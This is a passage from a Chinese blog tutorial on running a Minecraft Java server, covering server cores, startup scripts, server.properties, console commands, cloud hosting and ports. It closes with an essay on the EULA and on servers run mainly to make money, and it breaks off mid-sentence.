class="lvl-3"><p>forge + spigot 混合服</p></li><li class="lvl-3"><p>插件服</p></li></ol><p>下面逐一介绍每个模式对应的核心</p><blockquote><p>官服：bugjiang(mojang)发布的服务端，不支持 mod 和插件，支持数据包 <a href="https://www.minecraft.net/zh-hans/download/server">下载官核</a></p></blockquote><blockquote><p>纯 fabric 端：生电首选，保留了绝大部分原版特性。能安装 fabric mod 以及数据包，不支持插件和 forge mod。兼容性非常好。<a href="https://fabricmc.net/use/server/">Download Minecraft Server Launcher | Fabric (fabricmc.net)</a></p></blockquote><blockquote><p>纯 forge 端：整合包首选，修复了部分原版特性。能安装 forge mod 和数据包，不兼容 fabric mod。兼容性较差。<a href="https://files.minecraftforge.net/net/minecraftforge/forge/index_1.16.5.html">Downloads for Minecraft Forge for Minecraft 1.16.5</a></p></blockquote><blockquote><p>forge + spigot 混合服：既能装 forge mod，又能装 spigot 插件，虽然五脏俱全但是兼容性更差了，崩服、forge mod 不兼容是常见的事</p></blockquote><blockquote><p>插件服：只能装插件，技术难度无上限。好处是没有了 mod 莫名其妙报错的干扰，容易确定报错点，也没有 mod 服不能随便卸 mod 的困扰。插件服核心种类丰富，如一家独大的 Paper 以及一些分支，老牌 spigot。不同插件服有不同的优势。</p><p>paper：优化很好，修复了很多特性，性能更强，支持的插件极为丰富。更新速度比 spigot 慢几个小时或者几天。</p><p>folia(paper 分支)：paper 团队新产品，为数不多支持多线程的服务器，配置后生电限制少，插件库正在发展，未来可期。</p><p>purpur：做了大量优化，可以通过配置选择性打开生电选项，插件丰富，插件生电服首选。</p><p>spigot：优化略微逊色，特性修复较少(不足以生电)，支持的插件极为丰富，更新速度非常快，新版本发布后几个小时内就能用上 spigot。</p><p>还有很多很多核心。但这几款以及足够新手腐竹用了。</p><p>插件服发展史放到后面说。</p></blockquote><p>现在，新建文件夹，将你的核心 .jar 文件放进去，就到达了新世界的门口</p><hr><h4 id="编写启动脚本">编写启动脚本</h4><p>？？什么？编写？不是说不用编程的吗？</p><p>编写启动脚本可不是编程，而且相当简单。</p><p>为什么要编写脚本？主要是给 java 提供参数设置，给 java 一些设置，让 java 的运行符合预期。</p><p>如何编写？在<strong>windows</strong>下，需要新建文本文件，在文件内填入以下内容后将文件后缀的 txt 改为 bat。在<strong>linux</strong>下，<a href="http://xn--b0t52m507a3jl.sh">需要新建.sh</a> 文件，填入的内容需要去掉 <code>@ECHO OFF</code> 和 <code>pause</code>，其他内容相同。</p><p>这是一个最简单的启动程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\Program Files\Java\jdk1.8.0_301\bin\java&quot;</span> -jar server.jar</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>看不懂没关系，下面对这些内容逐一解释</p><p>首先是最开始引号内的路径，这是指定 java 路径的语句，如果没有配置环境变量，或者是想要指定这个服务器用哪个版本的 java，就可以用这个语句来指定 java。这个路径可以是绝对路径，也可以是相对路径。如果配置好了环境变量，连同引号在内所有内容都可以用 java 代替，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar server.jar</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>然后是 <code>-jar</code> ，作用是启动 jar 文件(在这里就是指服务器核心)，后面的 server.jar 是指定的核心名。</p><p>然后是 <code>pause</code> ，代指程序暂停，这是一个系统命令，与 java 无关。这个命令最大的用处在于，他会让终端在服务器关闭后不会直接消失，这样会很方便查看崩服的原因，不然只能看日志了。</p><p>这是一个最简单的启动示例，还有各种各样的启动参数，比如 <code>-Xms</code> <code>Xmx</code> <code>Xincgc</code> 等等，下面是一个很常见的启动参数，相比上面的参数，增加了内存控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -Xms1G -Xmx4G -jar server.jar</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><blockquote><p><strong>-Xmx</strong>：最大内存，默认为物理内存的 1/4 或者 1G，必须大于 2M，可以指定单位 k(K),m(M),g(G)</p><p><strong>-Xms</strong>：初始化内存大小(可以理解为最小内存大小)，默认为物理内存的 1/64，需大于 1M，单位上同</p><p><strong>-Xincgc</strong>：开启增量 GC[垃圾收集(Garbage Collection)通常被称为 “GC”]；这有助于减少长时间 GC 时应用程序出现的停顿。但可能会降低 CPU 对应用的处理能力。</p><p>对于 forge mod 服(包括 sponge)，建议将-Xmx 和-Xms 设为同值</p></blockquote><p>下面是推荐的启动脚本(具体内存数按需更改，分配的内存不要过少)</p><p>纯净：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@ECHO OFF</span><br><span class="line">java -server -Xms4g -Xmx8g -XX:+AggressiveOpts -XX:+UseFastAccessorMethods -XX:+UseG1GC -XX:SurvivorRatio=6 -XX:G1ReservePercent=15 -XX:ParallelGCThreads=4 -XX:ConcGCThreads=1 -XX:InitiatingHeapOccupancyPercent=40 -jar 核心名.jar</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>mod：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@ECHO OFF</span><br><span class="line">java -server -Xms8g -Xmx8g -XX:+AggressiveOpts -XX:+UseFastAccessorMethods -XX:+UseG1GC -XX:SurvivorRatio=6 -XX:G1ReservePercent=15 -XX:ParallelGCThreads=4 -XX:ConcGCThreads=1 -XX:InitiatingHeapOccupancyPercent=40 -jar 核心名.jar</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>这样就完成了启动脚本的编写。启动脚本需要放到核心同级目录里（也就是在一个文件夹内既要看到核心，又要看到启动脚本）</p><hr><h3 id="启动">启动</h3><h4 id="EULA">EULA</h4><p>一切准备就绪，windows 下直接双击启动脚本，linux <a href="http://xn--ghq9tqo683d8wuci0a18k.sh">下使用指令运行.sh</a> 文件</p><p>如果一切是从头开始且没有报错的话，不出意外，你的程序会暂停。</p><p>这是因为你需要同意 EULA 协议，你可以在终端看到 EULA 提示。</p><blockquote><p><strong><a href="https://link.zhihu.com/?target=https%3A//account.mojang.com/documents/minecraft_eula">Minecraft® EULA 协议</a></strong>，官方网址 <a href="https://link.zhihu.com/?target=https%3A//account.mojang.com/documents/minecraft_eula">https://account.mojang.com/documents/minecraft_eula</a>。其 EULA 协议本质上就是 Minecraft 的发行工作室 Mojang AB 对于 Minecraft 所有用户的一个使用协议。</p></blockquote><p>在服务器文件夹可以看到有个名为 eula.txt 的文件，打开后将 false 改为 true，就代表你同意了协议，然后再次打开服务器即可。<s>没人会憨到改为 true 后把这个文件删掉吧</s></p><p>虽然这是一个无关紧要的必须同意协议，但是我希望所有服主都认认真真看一遍。在最后也会谈到这个问题。</p><h4 id="服务器结构">服务器结构</h4><p>在终端看到 <code>Done</code> 时，代表服务器启动完毕。在这过程中服务器会自动补全所有必要的文件。</p><p>不同服务器核心，结构略微有所区别。下面是官核结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">服务器文件夹</span><br><span class="line">├─crash-reports //崩溃报告</span><br><span class="line">├─logs //日志，存储终端所有内容</span><br><span class="line">├─world //地图文件</span><br><span class="line">├─banned-ips.json//被ban的ip列表</span><br><span class="line">├─banned-players.json//被ban的玩家</span><br><span class="line">├─eula.txt//EULA协议</span><br><span class="line">├─server.jar//服务器核心</span><br><span class="line">├─ops.json//op以及op等级列表</span><br><span class="line">├─server.properties//服务器配置文件</span><br><span class="line">├─usercache//玩家id、uid、最近一次入服的记录</span><br><span class="line">├─whitelist//白名单列表</span><br><span class="line">├─启动脚本</span><br></pre></td></tr></table></figure><p>其他核心结构与官核大差不差，比如 mod 服会多出一个 mods 文件夹，插件服会多出一个 plugins 文件夹，混合服则多出上述两种文件夹。</p><h5 id="logs-和-crash-reports">logs 和 crash-reports</h5><p>用于记录服务器日志和崩溃原因。这是日后对服务器崩溃进行处理、寻找崩溃原因、抓熊孩子等等重要取证文件。</p><p>如果在这些目录中发现了.tar.gz 格式，这是压缩格式的一种，用解压软件打开即可。</p><h5 id="地图结构">地图结构</h5><p>地图结构在不同服务器核心会有变化。如果使用 paper 核心，会发现还有 <code>world_nether</code> <code>world_the_end</code> 两个文件夹，分别代表地狱和末地文件夹。而 world 文件夹相比其他核心，少了 <code>DIM1</code> 和 <code>DIM-1</code> 文件夹。</p><p>这是核心对地图结构的改变，DIM1 相当于 world_the_end，DIM-1 相当于 world_nether。</p><p>如果后续使用了多地图插件，或者是能生成更多维度世界的 mod，在两种地图结构中会发现，生成的地图(假设名为 DIM3)位置也不同，在类似于 paper 一样的地图结构中，会生成在 world 文件夹外面，和 world、world_nether、world_the_end 并列；在类似于原版的地图结构中，DIM3 会生成在 world 文件夹内，和 DIM1、DIM-1 并列，被 world 文件夹包含</p><p>如果想要在两种地图结构中互相改变，只需要将文件夹重命名后放到对应结构位置即可。</p><h6 id="更改服务器地图">更改服务器地图</h6><p>如果想将预设地图放到服务器内，首先要按照服务器地图结构将原地图进行结构变化</p><p>结构变化后，将服务器关闭，删除现有服务器地图，将预设地图拷贝进来即可</p><p>需要注意的是，如果一些插件强制规定了进入服务器时的位置，需要及时更改这个设置。常规方法是先记住预设坐标，在服务器中 tp 到坐标位置，然后将强制规定的进入服务器时的位置在游戏内用指令更改为这个坐标；或者是直接修改插件配置文件。</p><h5 id="mods-plugins">mods / plugins</h5><p>用于安装 mod 和插件的文件夹，将需要安装的.jar 文件直接拖入即可。</p><h6 id="mod">mod</h6><p>要注意模组加载器是否匹配，游戏版本是否匹配，是否有冲突，是否缺少前置。forge 模组报错首先搜一下报错内容，或者全部复制下来问 ai。没用解决方案的话就需要联系模组作者了。</p><p><strong>下载 mod 推荐<a href="https://www.mcmod.cn/download/">mcmod</a>、<a href="https://www.curseforge.com/">CurseForge</a>、<a href="https://modrinth.com/">Modrinth</a></strong></p><h6 id="plugin">plugin</h6><p>同 mod 要求。插件一般情况下会在 plugins 文件夹生成一个以插件名命名的文件夹，里面存放插件各种配置文件。这些配置文件需要按照插件文档进行修改。可以在后台使用指令 <code>plugins</code> 查看插件情况。</p><p><strong>下载插件推荐<a href="https://www.spigotmc.org/">SpigotMC</a>、<a href="https://www.curseforge.com/">CurseForge</a></strong></p><h5 id="server-properties-详解">server.properties 详解</h5><blockquote><p><strong>server.properties</strong>是储存多人游戏（Minecraft 或 Minecraft Classic）服务器所有设置的文件。</p><p>在编辑 server.properties 时，行之间的顺序可以打乱，但文件结构不能改变。每一行的等号之前的文本为变量名，你不应该修改这些内容。等号后面为变量的值，你可以按照规则自行编辑。以<code>#</code>开头的行为注释，添加、修改或移除注释行不会对游戏造成影响。</p><p>保存了 server.properties 的更改之后，服务端必须重启才能使更改生效，另一种选择是在服务器后台或游戏中使用<code>/reload</code>命令重新加载，但有时候会产生卡顿。</p><p>如果 server.properties 文件未列出一些属性（例如服务端版本更新加入新属性，或该文件还未创建），那么服务器在启动时会重写 server.properties 补全缺失的属性，并将缺失的属性值设为默认值。</p><p>尽管有扩展名，server.properties 文件只是一个普通的 UTF-8 编码文本文件，因此可以使用任何文本编辑器进行编辑，比如 Windows 上的记事本、macOS 上的 TextEdit 或者 Linux 上的 nano 和 vim。</p></blockquote><p>下面是 server.properties 配置文件的重要部分的注释，还有一部分翻译一下就出来了~~(blog 好像炸了)~~</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#Minecraft server properties</span><br><span class="line">#（文件修改时间戳）</span><br><span class="line">enable-jmx-monitoring=false</span><br><span class="line">rcon.port=25575</span><br><span class="line">level-seed=// 地图种子，空为随机</span><br><span class="line">gamemode=survival// 默认游戏模式，可能被其他插件/mod取代</span><br><span class="line">enable-command-block=false// 是否启用命令方块</span><br><span class="line">enable-query=false</span><br><span class="line">generator-settings=&#123;&#125;</span><br><span class="line">enforce-secure-profile=false// 强制安全验证</span><br><span class="line">level-name=world// 主世界地图文件夹名</span><br><span class="line">motd=A Minecraft Server// motd文本，没啥用，很鸡肋，可以被mod/插件取代</span><br><span class="line">query.port=25565</span><br><span class="line">pvp=true// 是否启用pvp，也可以被mod/插件取代</span><br><span class="line">generate-structures=true// 是否生成结构</span><br><span class="line">max-chained-neighbor-updates=1000000</span><br><span class="line">difficulty=easy// 游戏难度</span><br><span class="line">network-compression-threshold=256</span><br><span class="line">max-tick-time=60000// 最大延迟</span><br><span class="line">require-resource-pack=false// 是否需要资源包</span><br><span class="line">use-native-transport=true</span><br><span class="line">max-players=20// 最大玩家数(鸡肋，没用)</span><br><span class="line">online-mode=false// 是否开启正版验证</span><br><span class="line">enable-status=true</span><br><span class="line">allow-flight=false// 是否允许飞行(用来防飞行挂的，但是会防生存使用飞行类mod)</span><br><span class="line">initial-disabled-packs=</span><br><span class="line">broadcast-rcon-to-ops=true</span><br><span class="line">view-distance=10// 最大视距</span><br><span class="line">server-ip=</span><br><span class="line">resource-pack-prompt=</span><br><span class="line">allow-nether=true// 是否生成地狱(false的话将不会加载地狱，也无法进入)</span><br><span class="line">server-port=25565// 服务器端口</span><br><span class="line">enable-rcon=false</span><br><span class="line">sync-chunk-writes=true</span><br><span class="line">op-permission-level=4// op等级权限</span><br><span class="line">prevent-proxy-connections=false</span><br><span class="line">hide-online-players=false</span><br><span class="line">resource-pack=// 资源包链接</span><br><span class="line">entity-broadcast-range-percentage=100</span><br><span class="line">simulation-distance=10</span><br><span class="line">rcon.password=</span><br><span class="line">player-idle-timeout=0</span><br><span class="line">force-gamemode=false</span><br><span class="line">rate-limit=0</span><br><span class="line">hardcore=false</span><br><span class="line">white-list=false// 是否启用白名单</span><br><span class="line">broadcast-console-to-ops=true</span><br><span class="line">spawn-npcs=true</span><br><span class="line">spawn-animals=true</span><br><span class="line">log-ips=true</span><br><span class="line">function-permission-level=2</span><br><span class="line">initial-enabled-packs=vanilla</span><br><span class="line">level-type=minecraft\:normal</span><br><span class="line">text-filtering-config=</span><br><span class="line">spawn-monsters=true</span><br><span class="line">enforce-whitelist=false</span><br><span class="line">spawn-protection=16</span><br><span class="line">resource-pack-sha1=</span><br><span class="line">max-world-size=29999984</span><br></pre></td></tr></table></figure><p>也可以参考这篇文章<a href="https://www.bilibili.com/read/cv7149916/">Minecraft 服务器 server.properties 属性文件介绍 (最详细 最全 汉化) - 哔哩哔哩 (bilibili.com)</a></p><h4 id="控制台指令和重要指令">控制台指令和重要指令</h4><p>后台使用指令时候，在原版指令的基础上，去掉了最开始的 <code>/</code></p><p>比如，<code>/gamemode</code> 在后台只需要 <code>gamemode</code></p><p>如果指令是双斜杠开头，比如 worldedit 中的 <code>//copy</code>，需要删掉一个 <code>/</code>，也就是在后台输入 <code>/copy</code> <s>(不过这个指令好像不能在后台执行)</s></p><p>几个很重要的指令(这些指令游戏内也可以用，需要 op 权限)：</p><ol><li class="lvl-3"><p><code>stop</code> 关服指令，尽量不要直接 x 掉或强制关闭进程，很可能回档、丢数据</p></li><li class="lvl-3"><p><code>reload</code> 重载指令，重新加载服务器配置文件以及数据包，但会产生卡顿</p></li><li class="lvl-3"><p><code>list</code> 列出所有在线玩家(包括 carpet 的假人)，这个指令也可以用来检测服务器是否正在运行</p></li><li class="lvl-3"><p><code>kick id</code> 踢出玩家，id 为玩家名</p></li><li class="lvl-3"><p><code>ban id</code> ban 掉玩家，id 为玩家名</p></li><li class="lvl-3"><p><code>ban-ip ip/id</code> ban 掉一个玩家所在的 ip，或直接 ban 掉某个 ip</p></li><li class="lvl-3"><p><code>pardon id</code> 解 ban 指令，id 为玩家名</p></li><li class="lvl-3"><p><code>pardon-ip ip</code> 解 ban 指令，ip 为有效地址</p></li><li class="lvl-3"><p><code>banlist</code> ban 列表</p></li><li class="lvl-4"><p><code>op id</code> 给玩家 op 权限，id 为玩家名</p></li><li class="lvl-4"><p><code>deop id</code> 撤掉 op 权限，id 为玩家名</p></li><li class="lvl-4"><p><code>plugins</code> 查看插件情况，绿色为正常，黄色为存在部分问题，红色为出现的问题影响正常功能，基本不能使用</p></li></ol><p>虽然控制台权限至高无上，但是有些指令不能在后台用(比如涉及插件的 gui 界面)</p><hr><h3 id="云服务器、物理机">云服务器、物理机</h3><p>现在整个服务器运行在你的本地，如果想要一直开服，需要 24h 保持运行，这对大部分人来说是不可能的。那么如何解决这个问题呢，那就是云服务器 / 物理机了</p><p>下面将云服务器称为机子，我的世界服务器称为服务器，一是方便区分，二是习惯称呼</p><p>什么是机子？简单来说，就是远程电脑，这个电脑能保持开机状态，并且服务商提供了公网 ip 和端口让你能从外部连接到机子后台，还会提供一些开放端口让你能够进入服务器。</p><h4 id="如何选择机子，配置怎么看">如何选择机子，配置怎么看</h4><p>选择机子三要素：稳定，价格，配置</p><p>稳定性不用多说，谁都不希望玩着玩着突然机子关机了。当然，大多数服务商不会烂到这种地步。</p><p>价格方面，配置越高，价格越高。阿里、华为、腾讯等等大厂的价格极高，在没有优惠的情况下不建议购买。小厂商推荐剑客云、蓝夜科技等。一般来说，一个服务商如果有浏览器控制机子后台的功能(并不是指浏览器控制 mc 服务器后台)，那么这个厂商就可以纳入考虑范围之内。<s>因为实现这个功能很麻烦，跑路服务商才不会做</s></p><p>配置方面，看服务器规模。配置几大要素分别是：cpu、内存、硬盘、宽带。</p><p>cpu：mc 作为单核游戏，不用过多考虑服务器核心太少，只需要单核性能足够强大。当然，如果是 folia，可以选择降低单核性能，选择更多核心，这样可以利用 folia 多核心性质来降低成本。</p><p>内存：2g 起步。生电服推荐 10g 左右，给服务器分 8g(再多点就更好了，8g 有点勉强)。如果是插件服或者模组服，按照插件和模组的多少进行调动。不要担心内存占用太高，内存就是拿来用的，除了系统运行需要外，空 1、2g 内存就是在浪费。</p><p>硬盘：10g 起步，服务器开到后期会发现占用硬盘的大头不是插件和模组，而是地图。可以一开始选择较小硬盘，逐渐增加。适当时候开启新周目。</p><p>宽带：1Mbps(M) = 128 kb/s。这个绝对是值得花钱的地方。如何估算呢？而一个用户，在不大规模加载地图时候，大概是消耗服务器带宽 20kb/s 左右。玩家加载地图时候的瞬时带宽可能会突破 200kb/s。所以，1M=2.5 人左右~~(有点诡异)~~，推荐 3M 起步。</p><p>以上都是云服务器需求，如果物理机，考虑因素更多了。<s>物理机一般比较昂贵，没钱，所以没有经验</s></p><h4 id="如何配置端口">如何配置端口</h4><p>假设现在将服务器已经完整放到机子上，并且能正常运行了。</p><p>在 server.properties 配置文件中查看 server-port 项，默认 25565，这是内网端口，现在需要将内网端口开放出去。</p><p>开放端口有两种类型，一是对称开放，也就是内网端口和对应的外网端口相同；二是非对称开放，内网端口和对应的外网端口不同。</p><p>服务商规定不一定相同，一般有下面几种情况</p><ol><li class="lvl-3"><p>规定给某一部分端口开放</p><p>这种属于规定开放的对称端口，只需要将 server-port 值修改为规定端口，然后在游戏内使用 ip:端口的形式进入即可(也有可能是 域名:端口)</p><p>比如规定 30000 为开放端口，将 server-port 改为 30000，然后使用 ip:30000 作为服务器地址即可进入游戏</p></li><li class="lvl-3"><p>自由开放端口，但是开放的外网端口和内部端口不同</p><p>这种属于非对称开放端口，假设 server-port 设为 25565，外网端口生成为 30000，那么就使用 ip:30000 进入游戏</p></li><li class="lvl-3"><p>自由开放端口，开放的外网端口和内网端口相同</p><p>属于对称开放端口，和第一种情况相同，只是没用端口数量和端口号的限制</p></li></ol><h3 id="如何进入服务器">如何进入服务器</h3><p>如果是在自己电脑上开服，自己只需要在服务器地址输入 <code>0.0.0.0</code> 即可，也可以是 <code>127.0.0.1:25565</code> 、<code>localhost:25565</code> 。注意，25565 改为实际内网端口，也就是 server-port 的值。</p><p>如果已经放到云服务器上，按照 <code>ip:外网端口</code> 或者 <code>域名:外网端口</code> 的格式即可</p><p>比如我的域名是 <a href="http://gubaiovo.com">gubaiovo.com</a>，外网端口是 25565，那么服务器地址填写 <code>gubaiovo.com:25565</code> 即可，如果是 ip 的话同理</p><p>mod 服须知，尤其是 forge mod，要确保服务端 mod 和客户端 mod 列表相同。在 mcmod 页面可以看到 mod 安装要求，有的 mod 需要双端都装，有的只需要一端，有的只能一端。forge 要求很严格，客户端必须也是 forge 端。fabric 大部分为优化 mod，要求相对较松。</p><p>正版问题，只需要更改 online-mode 项。如果使用了第三方皮肤站作为登录方式，那么需要设为 true 而不是 false。如果设为 false(离线登录)，那么 uuid 将会由本地分配而不是微软分配，再次更改为 true 时需要考虑玩家数据问题。因为这个问题不能进入服务器的玩家通常收到的提示时“无效的会话”</p><hr><p>基础教程结束。通过以上教程，相信开一个简单的基友服不是问题了。</p><hr><h2 id="进阶教程">进阶教程</h2><p>锦上添花，选用外部优秀教程。<s>我对教程帖挺挑剔的，所以用的都是我觉得不错的帖子</s></p><h3 id="如何使用自己的域名替代-ip-端口-的格式">如何使用自己的域名替代 ip:端口 的格式</h3><p><a href="https://www.bilibili.com/read/cv5920366/">Minecraft 联机中如何用域名替换 IP 和端口? - 哔哩哔哩 (bilibili.com)</a></p><h3 id="如何为服务器添加-MCDR">如何为服务器添加 MCDR</h3><p><a href="https://docs.mcdreforged.com/zh-cn/latest/quick_start.html">快速上手 — MCDReforged 2.13.2 文档</a></p><h3 id="如何实现与基岩版互通">如何实现与基岩版互通</h3><p><a href="https://www.bilibili.com/read/cv31318719/">我的世界间歇泉 Geyser 配置文件 config 注释版！ - 哔哩哔哩 (bilibili.com)</a></p><p><a href="https://www.bilibili.com/read/cv8621880/">Geyser 间歇泉实现 Minecraft 基岩版/JAVA 版互通服 - 哔哩哔哩 (bilibili.com)</a></p><p><a href="https://doc.natfrp.com/offtopic/mc-geyser.html">Minecraft Geyser 互通服开服指南 | SakuraFrp 帮助文档 (natfrp.com)</a></p><h3 id="如何使用面板控制服务器-使用-MCSM">如何使用面板控制服务器(使用 MCSM)</h3><p><a href="https://www.bilibili.com/read/cv20156621/">MCSManager——MC 服务器配置超全教程(Win) - 哔哩哔哩 (bilibili.com)</a></p><h2 id="杂谈-EULA">杂谈 EULA</h2><p>这里只讨论国际服，不讨论网易。</p><p>从小学到现在(2024.10)，也算是 mc 腐竹圈的中年人了，也见证了国内 mc 服务器环境的变化。</p><p>从最开始多玩盒子联机，到网易接手后联机难度大大降低，网易上各种服务器、联机房间兴起，再到越来越多人加入国际服，pcl、hmcl 独占一方。</p><p>曾经 mcbbs 是众多服务器开发者、插件开发者、插件搬运工的聚集地，为国内提供了相当便利的资源站，也是国内很多腐竹的起点。2020 年左右算得上是国内腐竹涌现的时期，其中有良心腐竹，积极听取玩家建议，努力维护服务器，也有渣滓从 bbs 下个快餐服，圈钱跑路。</p><p>良心维护也好，圈钱也好，都是个人想法，mojiang 的 eula 从来只是防君子不防小人。人家国外都一堆圈钱服，国内有什么理由不能有呢？双方自愿对吧。</p><p>但是，双方自愿的前提是，双方，至少是玩家，对游戏还有足够的积极度。</p><p>mc 是一款沙盒游戏，这款游戏是极度依赖社区创作的。如果 mojang 把 mod 全锁死，严格禁止光影材质包，严格禁止第三方服务器，那么这游戏已经离死不远了。</p><p>而大多数玩家是没有创作能力的，真正的创作技术掌握在少数人手里，要想让少数人的技术满足大部分人的预期，那么创作者要有创作的动力，玩家要有提出意见的积极性。</p><p>现在假设腐竹为 A，开发者为 B，服务器内有两个玩家 C 和 D，C 相对富裕，有赞助的能力。</p><p>A 看好 B 的一个作品，花钱得到 B 作品的使用权，C 喜欢服务器的模式，在遵守 eula 的前提下为服务器赞助，D 没有赞助能力，但是他能够宣传给朋友们，带动更多人来玩服务器。</p><p>这是一个很正常的发展模式，在这个过程中，A 有了玩家们的支持，愿意继续维护，B 有了 A 的投资，有了创作动力，C 和 D 在服务器也满足了自己的游戏体验，这是一个良性发展模式。</p><p>而快餐服的存在，省去了 A 购买 B 使用权的过程，有的只是 A 无限收割玩家的热情。B 缺少了创作积极性，优秀作品逐渐减少。不过当然对 A 没有影响了，因为 A 已经不再购买 B。C 和 D 的热情没有得到正向反馈，热情减少，C 的赞助减少，D 的宣传作用减弱，A 收割的越来越少，直至没人愿意继续在他的服务器玩，于是 A 关掉服务器，不知从何处搞到另一个快餐服，继续以上模式。</p><p>受影响的只有 B，C，D。这就是为什么快餐服会削减社区整体积极性。</p><p>在 mcbbs 崩盘之后，直到现在，快餐服群体受了很大打击。为什么呢？因为没资源了，那些圈钱腐竹不懂技术，不会升级服务器版本，不会替换新版插件，不知道流行 mod 是什么。</p><p>想象中是，快餐服倒闭后，大量玩家涌入良心服务器，良心服茁壮成长。</p><p>可是曾经习惯快餐服的玩家，早就没了积极性，快餐服的快节奏也无法融入到良心服相对较慢的节奏。</p><p>于是玩家整体规模开始下滑，市场开始缩减。良心腐竹们苦苦维持，全凭着一腔热血，但总有放弃的时候。</p><p>以至于现在，出名服务器两只手可以数过来，一个服务器超过十个人常驻就谢天谢地了。</p><p>mc 整体规模下降肯定还有别的原因，但我常混迹在腐竹圈，快餐服是我见到的最直接的原因。</p><p>说白就是 eula 管的太松了，mojang 在当地都不怎么管，更何况山高皇帝远，mojang 几乎不可能管到中国来。</p><p>eula 不只是在开服时候强制要求你同意的一个文件，更应该作为每个腐竹的规范。如何运维好服务器？eula 已经给出答案了。下面是 eula 的部分原文。</p><blockquote><p>本 EULA 是您和我们（Mojang AB 和微软公司或（如适用）下文的“企业信息”一节列出的其当地关联公司之一）之间达成的法律协议。您应该阅读完整内容，但此处简要总结了一些要点以便为您提供指导，完整条款和条件仍然适用。</p><ul class="lvl-1"><li class="lvl-2">本 Minecraft EULA 和<a href="https://www.microsoft.com/servicesagreement">微软服务协议</a>共同适用于所有 Minecraft 服务。</li><li class="lvl-2">您的内容为您所有，但请负责任和安全地分享它。</li><li class="lvl-2">我们的社区标准帮助我们建立一个对所有人开放和安全的社区。</li><li class="lvl-2">您可以开发工具、插件和服务，前提是它们看起来不是官方项目或者看起来未经过我们批准，例如不使用我们的徽标。</li><li class="lvl-2">未经我们允许，请勿分发或将我们创建的任何内容用于商业用途。</li><li class="lvl-2">我们会尽可能做到公开、诚实和相信他人，希望您对我们也是如此。</li></ul></blockquote><blockquote><h2 id="您可以和不可以用-Minecraft-软件和内容做的事情"><strong>您可以和不可以用 Minecraft 软件和内容做的事情</strong></h2><p>您购买我们的游戏后，可以下载、安装和畅玩这些游戏。对于 Minecraft：Java 版的 服务器版本，您可以将其安装在服务器上并主持在线游戏。</p><p>但是，除非我们明确同意，否则您不得分发我们创建的任何内容。“分发我们创建的任何内容”是指：</p><ul class="lvl-1"><li class="lvl-2"><p>向任何其他人提供我们的游戏软件或内容；</p></li><li class="lvl-2"><p>将我们创建的任何内容用于商业用途；</p></li><li class="lvl-2"><p>试图通过我们创建的任何内容赚钱；或者</p></li><li class="lvl-2"><p>允许其他人以不公平或不合理的方式访问我们创建的任何内容。</p></li></ul><p>因此，为清楚起见，“游戏”或“我们提供的内容”包括但不限于服务以及我们将来可能发布的任何其他游戏。它还包括游戏的更新、补丁、可下载内容、市场内容、加载项或修改版本、这些内容的一部分、商品、视听内容，或我们提供的任何其他内容。</p><p>除此之外，我们对您做的事情要求非常宽松，事实上我们鼓励您做一些很酷的事情，只是不要做我们规定不能做的那些事情即可。</p></blockquote><p>一句话来说，就是</p><blockquote><p><strong>Minecraft 这个游戏是我们的，请不要利用我们的游戏来赚钱。</strong></p></blockquote><p>但是 eula 的存在并不为人所知，甚至很多人不知道这到底是什么东西。不像其他应用强制要求看完的用户协议，mc 的 eula 除了开服时候提示一下之外，从来没刻意强调过自己的存在。这也是有原因的，因为 mc 的 eula 针对的不是玩家群体，而是利用 mc 去赚钱的人。</p><p>服务器是整个 mc 与资本关系最密切的地方，优秀资源在外可以自由分享，但是一旦到了服务器上就开始变味了。</p><p>服务器运营需要成本，需要钱去租机子，需要时间去打磨。腐竹们需要维持运营就需要收入，收入可以是自己工作获得，也可以以公益赞助方式分摊到广大玩家，更可以是吸引氪金成为商业服。</p><p>前两者是完全符合 eula 的，而第三者显然违反了 